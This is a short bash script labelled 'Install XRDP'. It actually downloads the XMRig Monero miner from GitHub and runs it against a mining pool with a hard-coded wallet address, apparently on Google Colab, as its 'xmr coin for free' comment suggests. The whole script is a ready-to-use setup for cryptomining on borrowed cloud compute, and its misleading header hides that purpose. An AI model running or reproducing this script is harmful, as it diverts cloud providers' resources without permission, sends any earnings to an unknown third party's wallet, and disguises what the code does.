#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 444ZHtocGqcAit6BmpwustJRz2c7FKxosQ8dYCBmQ9RPCFwX6Y8dGht16azx53ir7r9esTTm9rmkDaP7UvHJNgG1PbsGvAT -k --tls --rig-id GC-US
